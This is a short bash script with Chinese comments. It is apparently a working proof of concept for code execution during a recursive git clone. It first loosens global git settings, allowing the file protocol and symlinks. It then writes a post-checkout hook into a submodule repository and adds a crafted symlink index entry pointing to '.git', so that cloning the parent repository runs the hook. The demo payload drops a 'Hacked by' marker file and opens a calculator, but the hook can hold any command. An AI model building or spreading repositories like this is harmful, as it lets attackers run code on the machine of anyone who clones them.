#!/bin/bash

# 设置 Git 配置选项
git config --global protocol.file.allow always
git config --global core.symlinks true
# 可选，但我添加它以避免警告消息
git config --global init.defaultBranch main 


# 定义提示路径
tell_tale_path="$PWD/tell.tale"

# 初始化钩子仓库
git init hook
cd hook
mkdir -p y/hooks

# 将恶意代码写入钩子
cat > y/hooks/post-checkout <<EOF
#!/bin/bash
echo "Hacked by 峰叔叔官方" > /tmp/pwnd
calc.exe
open -a Calculator.app
EOF

# 使钩子可执行：重要
chmod +x y/hooks/post-checkout

git add y/hooks/post-checkout
git commit -m "post-checkout"

cd ..

# 定义钩子仓库路径
hook_repo_path="$(pwd)/hook"

# 初始化 captain 仓库
git init captain
cd captain
git submodule add --name x/y "$hook_repo_path" A/modules/x
git commit -m "add-submodule"

# 创建符号链接
printf ".git" > dotgit.txt
git hash-object -w --stdin < dotgit.txt > dot-git.hash
printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
git update-index --index-info < index.info
git commit -m "add-symlink"
cd ..

git clone --recursive captain hooked